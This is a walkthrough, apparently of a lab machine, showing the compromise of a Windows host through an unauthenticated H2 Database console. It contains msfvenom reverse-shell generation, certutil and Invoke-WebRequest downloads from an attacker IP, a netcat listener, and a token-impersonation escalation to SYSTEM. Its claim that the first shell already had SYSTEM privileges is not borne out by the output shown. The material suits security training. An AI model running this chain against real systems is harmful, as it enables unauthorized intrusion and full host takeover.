## NMAP

A comprehensive TCP port scan was performed using Nmap with service detection, default scripts, and OS fingerprinting. The command bypassed host discovery with the -Pn flag and scanned all 65535 ports, reporting only open ports. This identified running services, their versions, and potential operating system information, forming a baseline for further vulnerability analysis and exploitation.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.141.66  --open 
```

The Nmap scan results indicate a Microsoft Windows host running several notable services. Port 80 hosts an IIS 10.0 web server configured with a potentially risky HTTP TRACE method and a title referencing the H2 Database Engine. Port 445 suggests the presence of Windows SMB for file sharing, which is a common vector for enumeration and exploitation. Most significantly, port 8082 hosts the web-based H2 database console, an application often associated with critical misconfigurations and default credentials. Additional high-numbered ports are running Microsoft RPC services.

```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

```

This is a screenshot of the H2 Database Console login page. The interface shows saved connection settings for a "Generic H2 (Embedded)" instance. The pre-configured JDBC connection string is "jdbc:h2:mem:test", indicating an in-memory database. The default administrative username "sa" is populated with an empty password field. This presents a critical finding, as the H2 console is accessible without authentication and is configured with default credentials, allowing direct database access.

![[Pasted image 20251217234111.png]]

This screenshot displays the H2 Console help page, which contains a reference SQL script for creating a table, inserting data, and performing basic queries. The interface confirms full, interactive SQL command execution capability within the database. This demonstrates that an authenticated user has complete control over the database, enabling data extraction, modification, or deletion. The page also notes the ability to add additional JDBC drivers via environment variables, which could potentially be leveraged for further exploitation.

![[Pasted image 20251217234207.png]]


This screenshot is from the Exploit-DB entry for H2 Database version 1.4.199, detailing a JNI Code Execution vulnerability. The exploit is categorized as a local vulnerability requiring user interaction, likely involving the execution of Java Native Interface code through crafted SQL statements within the H2 console. This confirms the existence of a public exploit for the identified H2 database version, indicating a high-risk path to potential remote code execution on the underlying server if the console access is achieved.


![[Pasted image 20251217234551.png]]

This screenshot presents the full exploit code for the H2 Database JNI Code Execution vulnerability. The exploit uses SQL commands within the H2 console. It first writes a malicious native library DLL file to the disk using the CSVWRITE function. It then creates a Java alias to load this library and finally executes a shell command, demonstrated by calling "whoami". This confirms that by leveraging the unauthenticated H2 console access, an attacker can achieve arbitrary command execution on the underlying Windows host, elevating the finding to a critical severity.

![[Pasted image 20251217234619.png]]

A Windows x64 reverse TCP shell payload was generated using msfvenom. The payload was configured to connect back to the attacker's IP address, 192.168.45.155, on port 8082. The output format was set to a Windows executable file named "shell.exe". This executable is a malicious file created to establish a remote command shell connection from the compromised target host back to the attacker's machine.

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.155 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe


```

A Python HTTP server was started on port 8001 to host the generated "shell.exe" payload. The server logs indicate a successful HTTP GET request from the target host at IP address 192.168.141.66, downloading the malicious executable. This confirms the attacker's ability to stage the payload and the target system's capability to initiate an outbound HTTP connection to the attacker's machine.

```bash
python3 -m http.server 8001 
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
192.168.141.66 - - [18/Dec/2025 00:13:01] "GET /shell.exe HTTP/1.1" 200 -
192.168.141.66 - - [18/Dec/2025 00:13:01] "GET /shell.exe HTTP/1.1" 200 -


```


An SQL command was executed within the H2 database console to leverage the JNI code execution vulnerability. The command uses the previously created alias to call `java.lang.Runtime.getRuntime().exec()`. It instructs the target Windows host to download the "shell.exe" payload from the attacker's HTTP server using the `certutil` utility and save it to the C:/Windows/Temp directory. This demonstrates the successful exploitation of the vulnerability to achieve arbitrary command execution and download a malicious file to the target system.

```bash
CALL JNIScriptEngine_eval('java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.155:8001/shell.exe C:/Windows/Temp/shell.exe")');

```

A final SQL command was executed in the H2 console to trigger the previously downloaded payload. The command again uses the JNI exploit alias to call `Runtime.getRuntime().exec()`, this time executing the "shell.exe" file stored in C:/Windows/Temp. This action launches the reverse shell payload, which should establish a remote TCP connection back to the attacker's listener on the specified IP and port, providing a remote command shell on the target Windows host

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

A Netcat listener on port 8082 successfully received a connection from the target host at 192.168.141.66. This established a reverse shell session with SYSTEM-level privileges, as evidenced by the subsequent command output. The session confirmed the host details as Windows 10. The `whoami /priv` command revealed the shell possesses the critical `SeImpersonatePrivilege`, which is enabled and can be leveraged for privilege escalation. The exploit chain has fully compromised the host, providing unrestricted administrative access to the Windows system.

```bash
nc -lvp 8082                        
listening on [any] 8082 ...
192.168.141.66: inverse host lookup failed: Unknown host
connect to [192.168.45.155] from (UNKNOWN) [192.168.141.66] 50233
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>cd /
cd /

C:\>cd windows
cd windows

C:\Windows>cd system32
cd system32

C:\Windows\System32>whoami.exe/priv     
whoami.exe/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


```

The `systeminfo` command was executed to gather detailed system configuration. The output reveals the compromised host's name is JACKO. It is running Microsoft Windows 10 Pro, version 1909 (Build 18363), as a standalone workstation in a VMware virtual environment. The registered owner is listed as "tony". This information is critical for asset identification, understanding the system's patch level, and tailoring further post-exploitation actions. The absence of an organization name suggests a personal or developer machine.

```bash

C:\Windows\System32>systeminfo.exe
systeminfo.exe

Host Name:                 JACKO
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          tony
Registered Organization:   
Product ID:                00331-10000-00001-AA266
Original Install Date:     4/22/2020, 3:11:40 AM
System Boot Time:          8/2/2024, 11:57:26 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
```

The PowerShell command `Invoke-WebRequest` was executed within the established reverse shell session. The command downloaded a file named "god.exe" from the attacker's HTTP server at 192.168.45.155 on port 8001 and saved it locally to the current directory on the compromised host. This action indicates the attacker is staging additional tools or payloads on the target system for further post-exploitation activities.

```bash
Invoke-WebRequest -Uri "http://192.168.45.155:8001/god.exe" -OutFile "god.exe"
```

The "god.exe" binary was executed with the parameter to spawn "cmd.exe". The tool's output indicates it successfully searched for and identified a SYSTEM token from process ID 792, which had the Impersonation level. It then used this token to create a new process with PID 2748. The resulting command prompt session confirms the operation was successful, launching a new command shell with `NT AUTHORITY\SYSTEM` privileges. This demonstrates the use of a local privilege escalation exploit to reinforce SYSTEM-level access on the compromised host.

```bash
.\god.exe -cmd "cmd.exe"
Start Search System Token
[*] PID : 792 Token:0x700  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2748
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```